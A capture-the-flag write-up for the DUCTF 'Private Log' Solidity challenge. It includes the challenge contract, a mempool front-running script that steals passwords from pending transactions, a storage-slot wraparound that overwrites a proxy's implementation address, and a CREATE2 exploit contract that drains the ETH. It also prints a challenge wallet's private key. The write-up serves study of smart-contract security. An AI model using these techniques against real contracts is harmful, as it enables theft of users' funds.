# Private Log [3 solves] [500 points]

### Description
```
I thought I would try and save some gas by updating my log entries with assembly, I'm not super sure if it's safe, but I have added a password for good measure.

But it's okay because if there is a bug I can always upgrade since I'm using the TransparentUpgradeableProxy pattern :).

I love my creation so much that I add a new log every minute!

Note the block time on this challenge is 23 seconds, so there will a delay in deploying and resetting the challenge.

Goal: Steal all funds from the contract.

Author: @bluealder
```

I solved this challenge at the last moment, but made a stupid mistake on the exploit contract that I transferred ETH to a wrong address instead of the wallet. Then I have to reset the challenge which takes quite long and have to wait for the pending transaction for front running. Then the CTF ended and I could not submit the flag on time 🥲

This is a great challenge, the objective is to drain all ETH from the proxy contract and transfer to the wallet.

### PrivateLog.sol (implementation) : 
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

/**
 * @title Private Log
 * @author Blue Alder (https://duc.tf)
 **/

import "OpenZeppelin/openzeppelin-contracts@4.3.2/contracts/proxy/utils/Initializable.sol";


contract PrivateLog is Initializable {

    bytes32 public secretHash;
    string[] public logEntries;

    constructor() {
        secretHash = 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD;
    }

    function init(bytes32 _secretHash) payable public initializer {
        require(secretHash != 0xDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEADDEAD);
        secretHash = _secretHash;
    }

    modifier hasSecret(string memory password, bytes32 newHash) {
        require(keccak256(abi.encodePacked(password)) == secretHash, "Incorrect Hash");
        secretHash = newHash;
        _;
    }

    function viewLog(uint256 logIndex) view public returns (string memory) {
        return logEntries[logIndex];
    } 

    function createLogEntry(string memory logEntry, string memory password, bytes32 newHash) public hasSecret(password, newHash) {
        require(bytes(logEntry).length <= 31, "log too long");   
        
        assembly {
            mstore(0x00, logEntries.slot)
            let length := sload(logEntries.slot)
            let logLength := mload(logEntry)
            sstore(add(keccak256(0x00, 0x20), length), or(mload(add(logEntry, 0x20)), mul(logLength, 2)))
            sstore(logEntries.slot, add(length, 1))
        }
    }

    function updateLogEntry(uint256 logIndex, string memory logEntry, string memory password, bytes32 newHash) public hasSecret(password, newHash) {
        require(bytes(logEntry).length <= 31, "log too long");   
        
        assembly {
            let length := mload(logEntry)
            mstore(0x00, logEntries.slot)
            sstore(add(keccak256(0x00, 0x20), logIndex), or(mload(add(logEntry, 0x20)), mul(length, 2)))
        }

    }
}
```

### Briefly explaining what the contract does :

The challenge uses TransparentUpgradeableProxy, and `PrivateLog.sol` is the implementation.

There is password authentication for functions that changes the log. The first hash will be set in the initialization, and then there will be a wallet continously calling `createLogEntry()` to create log entry with the previous password and set a new hash. 

Some function call by that wallet :
```
7 : (<Function createLogEntry(string,string,bytes32)>, {'logEntry': 'Yep pretty good day today', 'password': '8a3yzfkDCmnoCVKZvsnMyzyCofbuoP', 'newHash': b'\xbe?9V\xb7 >&\x805U\xea\x10/\xf3\xd6\x84R\xc4\xdaXZ4\xe3y75\xd6\x12\x9by\xbe'})
9 : (<Function createLogEntry(string,string,bytes32)>, {'logEntry': 'Yep pretty good day today', 'password': 'UkAVBEhGOt8U11f2cEzbjewJCYyBs4', 'newHash': b'sL\xb1\xdf\xb2\xab\xd5x3<\r\x9c\x05/E\x94.\xd1\x8a\x06c\xfb\xfb\xe2y\xb1\x03\xdb\\\xdc\xadX'})
12 : (<Function createLogEntry(string,string,bytes32)>, {'logEntry': 'Yep pretty good day today', 'password': 'ymFwfHE4NzPkGIAW90vpEcGyKFpQ8q', 'newHash': b'\xec\xafk\xb8!\x1c\x01\x1e=\x0e\xb9\xc3\r\xe1\x1e5\x11\x16\x07\t\xe4\xba\xfe\x00=\x05|\xcd\xb52\x88\x96'})
15 : (<Function createLogEntry(string,string,bytes32)>, {'logEntry': 'Yep pretty good day today', 'password': 'qxAPrHDMHiNoIer2GuYr7q4Q39eKEZ', 'newHash': b'^\xdak\x1b\x10\xaa\xec\xb5\x8d\xea\xe3%~23\xab=-\xdc*\xeaf\xb0\\\xfb\x98Q\xc1[\xe2\xa2e'})
```

So front running is possible, we can listen for pending transaction in the mempool, then decode the calldata to get the password, and submit a transaction with high gas fee using that password and set a new hash that we know. Then that wallet won't be able to create log anymore as we controlled the password after front running.

After we controlled the password, we unlocked access to 2 more functions `createLogEntry()` and `updateLogEntry()`. `updateLogEntry()` updates existing log entry with assembly,and we can pass an arbitary value as the logIndex, and it will be able to write to any storage slot using assembly, as storage slot address is just like an uint256 which integer overflow is possible.

We can use it to overwrite the storage slot for the implementation address, if we can overwrite it then we have control on the proxy contract.

### How the challenge can be solved : 

First, we can create a script that will listen to the mempool do the front running, which it will steal the password and submit a transaction immediately after disocvering the pending transaction, and with a high gas fee so our transaction will be included in the block first, and we have control on the new password.

### Front running scirpt : 
```python
from web3 import Web3, HTTPProvider
from web3.middleware import geth_poa_middleware

web3 = Web3(HTTPProvider('https://blockchain-privatelog-f9478b59645b37be-eth.2022.ductf.dev/'))
web3.middleware_onion.inject(geth_poa_middleware, layer=0)

proxy_address = '0x6189762f79de311B49a7100e373bAA97dc3F4bd0'
implementation_abi = '[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint8","name":"version","type":"uint8"}],"name":"Initialized","type":"event"},{"inputs":[{"internalType":"string","name":"logEntry","type":"string"},{"internalType":"string","name":"password","type":"string"},{"internalType":"bytes32","name":"newHash","type":"bytes32"}],"name":"createLogEntry","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"bytes32","name":"_secretHash","type":"bytes32"}],"name":"init","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"logEntries","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"secretHash","outputs":[{"internalType":"bytes32","name":"","type":"bytes32"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"logIndex","type":"uint256"},{"internalType":"string","name":"logEntry","type":"string"},{"internalType":"string","name":"password","type":"string"},{"internalType":"bytes32","name":"newHash","type":"bytes32"}],"name":"updateLogEntry","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"logIndex","type":"uint256"}],"name":"viewLog","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"}]'

proxy_instance = web3.eth.contract(address=proxy_address, abi=implementation_abi)

wallet = '0x2a7f41EBf1d45DC5CAA25933B129f24AeE0A98C8'
private_key = '0xcfb3c1ccde0bec5b5f9b0cf01fc61541a09e68ec6256c3a69bf690674342aa15'


# get the nonce early, as we need to submit transaction quickly
nonce = web3.eth.getTransactionCount(wallet)

while True:
	global pending
	txns = web3.eth.filter('pending').get_new_entries()
	print(web3.eth.get_block_number())
	if (txns != []):
		print('Found pending transaction, stealing its password :')
		pending = web3.eth.get_transaction(txns[0])
		print(pending)
		break

calldata = pending.input
func, decoded = proxy_instance.decode_function_input(calldata)
print()
print('Decoded calldata :')
print(decoded)
password = decoded['password']
print(f'Password: {password}')


print('Trying to do the front running')
gasPrice = web3.toWei('999', 'gwei')
gasLimit = 1000000
tx = {
    'nonce': nonce,
    'gas': gasLimit,
    'gasPrice': gasPrice,
    'from': wallet
}
transaction = proxy_instance.functions.updateLogEntry(0, 'kaiziron', password, Web3.keccak(text='kaiziron').hex()).buildTransaction(tx)

signed_tx = web3.eth.account.sign_transaction(transaction, private_key)
tx_hash = web3.eth.sendRawTransaction(signed_tx.rawTransaction)
transaction_hash = web3.toHex(tx_hash)
tx_receipt = web3.eth.wait_for_transaction_receipt(transaction_hash)
print(tx_receipt['status'])
```

Then we can overwrite the implementation address with `updateLogEntry()`.

The implementation address is stored on slot `0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc` :
https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/proxy/ERC1967/ERC1967Upgrade.sol#L28

```python
>>> web3.eth.getStorageAt('0x6189762f79de311B49a7100e373bAA97dc3F4bd0', 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
HexBytes('0x0000000000000000000000006e4198c61c75d1b4d1cbcd00707aac7d76867cf8')
```

The first log of the `logEntries` array is at `0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace`

```python
>>> web3.toText(web3.eth.getStorageAt('0x6189762f79de311B49a7100e373bAA97dc3F4bd0', 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace))
'kaiziron\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10'
```


```python
>>> 2**256 - 0x405787fa12a823e0f2b7631cc41b3ba8828b3321ca811111fa75cd3aa3bb5ace + 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
111129467160948422887507396232037959382059785768469498084341381439174353932526
```
So, to overwrite the implementation address with the storage slot overflow, we can use `111129467160948422887507396232037959382059785768469498084341381439174353932526` as the `logIndex`

However, the logEntry is a string, and it must be less than or equal to 31 in length : 
```solidity
require(bytes(logEntry).length <= 31, "log too long");
```

If, we overwrite the implementation address with 31 'A's, it will look like this : 

```python
>>> web3.eth.getStorageAt('0x6189762f79de311B49a7100e373bAA97dc3F4bd0', 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbb)
HexBytes('0x414141414141414141414141414141414141414141414141414141414141413e')
```

the `3e` is the length of the string, which is stored on the same slot, as the string is only 31 bytes long.

So the last byte of our exploit contract's address must be `3e`, we can create a factory contract and bruteforce for a salt that will deploy an exploit contract with address ending with `3e` with CREATE2 : 
```solidity
// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

contract exploit {
    function transferETH() public {
        payable(tx.origin).transfer(address(this).balance);
    }
}

contract deployFactory {
    exploit public factory;

    function deploy(uint256 salt) public {
        factory = new exploit{salt: keccak256(abi.encodePacked(salt))}();
    }

    function storageOverflow(address proxy, bytes memory packedCalldata) public {
        (bool success, ) = proxy.call(packedCalldata);
        require(success);
    }

    function lastByte(bytes32 addr) public view returns (bytes1) {
        bytes1 result = addr[31];
        return result;
    }

    function getAddress(uint256 _salt) public view returns (address) {
        bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), keccak256(abi.encodePacked(_salt)), keccak256(type(exploit).creationCode)));
        return address(uint160(uint(hash)));
    }

    function bruteforceAddress() public view returns (address, uint256) {
        uint256 _salt;
        while(true){
            _salt++;
            bytes32 hash = keccak256(abi.encodePacked(bytes1(0xff), address(this), keccak256(abi.encodePacked(_salt)), keccak256(type(exploit).creationCode)));
            address addr = address(uint160(uint(hash)));
            if(keccak256(abi.encodePacked(lastByte(hash))) == keccak256(abi.encodePacked(bytes1(0x3e)))){
                return (addr, _salt);
            }
        }
    }
}
```

Call the `bruteforceAddress()` after deploying the factory contract, then deploy a contract with the returned salt with `deploy()`

Then, we can encode the calldata needed for overwriting the implementation contract, as python has issue handling non-printable characters, I will use 'A's as placeholder and replace it to the exploit contract address separately. But only the first 31 bytes of the address, without the `3e`, also we have to add padding.

```python
>>> proxy_instance.encodeABI(fn_name="updateLogEntry", args=[111129467160948422887507396232037959382059785768469498084341381439174353932526, 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA', 'kaiziron', Web3.keccak(text='kaiziron').hex()])
'0xdd1b54d3f5b10ca728f97f4013b0650b85127de547b2ed5501b62497262dfd15b97cd0ee000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c04a496c444efc65da39683a7b6fab2595e45275e70ed82d470f0296d8964ff99e000000000000000000000000000000000000000000000000000000000000001f414141414141414141414141414141414141414141414141414141414141410000000000000000000000000000000000000000000000000000000000000000086b61697a69726f6e000000000000000000000000000000000000000000000000'
```

The exploit address is : `0xB125810733e7cAb85401a966F6a02210Cc8b543e`, so replace the 'A's with padding and without the '3e' : `000000000000000000000000b125810733e7cab85401a966f6a02210cc8b54`

```python
>>> calldata.replace('41414141414141414141414141414141414141414141414141414141414141', '000000000000000000000000b125810733e7cab85401a966f6a02210cc8b54')
'0xdd1b54d3f5b10ca728f97f4013b0650b85127de547b2ed5501b62497262dfd15b97cd0ee000000000000000000000000000000000000000000000000000000000000008000000000000000000000000000000000000000000000000000000000000000c04a496c444efc65da39683a7b6fab2595e45275e70ed82d470f0296d8964ff99e000000000000000000000000000000000000000000000000000000000000001f000000000000000000000000b125810733e7cab85401a966f6a02210cc8b540000000000000000000000000000000000000000000000000000000000000000086b61697a69726f6e000000000000000000000000000000000000000000000000'
```

Then call `storageOverflow()` with the proxy address and that calldata as `bytes memory packedCalldata`, which will overflow the storage slot address and overwrite the implementation address : 

```python
>>> web3.eth.getStorageAt('0x6189762f79de311B49a7100e373bAA97dc3F4bd0', 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc)
HexBytes('0x000000000000000000000000b125810733e7cab85401a966f6a02210cc8b543e')
```

Then just call `transferETH()` on the proxy contract, as our exploit contract became the implementation. 100 ETH will be drained from the proxy contract and transfered to our wallet, then the challenge is solved.

![](https://i.imgur.com/u2royy4.png)

### Flag : 

```DUCTF{first_i_steal_ur_tx_then_I_steal_ur_proxy_then_i_steal_ur_funds}```